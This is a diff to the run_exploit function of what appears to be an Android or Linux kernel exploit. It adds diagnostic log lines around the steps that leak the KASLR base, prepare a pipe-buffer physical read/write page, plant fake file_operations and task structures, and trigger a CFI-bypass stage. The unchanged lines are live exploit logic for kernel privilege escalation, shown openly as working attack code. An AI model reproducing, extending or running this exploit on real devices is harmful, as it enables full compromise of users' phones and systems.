@@ -219,10 +219,13 @@ int run_exploit(int argc, char **argv) {
   init_ashmem_path();
 
   pin_to_core(CORE);
+  pr_info("DIAG: starting slide_leak_kernel_base\n");
   if (!slide_leak_kernel_base()) {
     pr_error("slide kaslr leak failed\n");
     return 1;
   }
+  pr_success("DIAG: kaslr leak ok base=%016zx slide=%016zx p0_offset=%08zx\n",
+             kaslr_base, kaslr_slide, slide_p0_offset);
   if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
     pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
                kaslr_base, kaslr_slide, slide_p0_offset);
@@ -230,23 +233,33 @@ int run_exploit(int argc, char **argv) {
   }
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  pr_info("DIAG: reset_pipe_attempt\n");
   reset_pipe_attempt();
   pipebuf_page_base = prepare_pipe_buffer_page();
-  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
+  pr_info("DIAG: pipe page=%016zx\n", pipebuf_page_base);
   if (!is_direct_ptr(pipebuf_page_base)) {
+    pr_warning("DIAG: pipe page not direct, aborting\n");
     return 1;
   }
 #endif
 
   pin_to_core(CORE);
+  pr_info("DIAG: prepare_good_kernel_page FOPS\n");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+  pr_info("DIAG: kernel page base=%016zx\n", page_base);
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (!page_base) {
+    pr_warning("DIAG: kernel page alloc failed\n");
     return 1;
   }
+  pr_info("DIAG: entering fops slide route fake_fops=%016zx fake_lock=%016zx "
+          "fake_w0=%016zx fake_task=%016zx\n",
+          fake_fops, fake_lock, fake_w0, fake_task);
   for (int attempt = 1; attempt <= 1; attempt++) {
+    pr_info("DIAG: app_trigger_fops_slide_route attempt=%d\n", attempt);
     int triggered = app_trigger_fops_slide_route();
+    pr_info("DIAG: fops triggered=%d, entering try_cfi_stage\n", triggered);
     int verified = triggered && try_cfi_stage();
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
             "step=%d errno=%d\n",
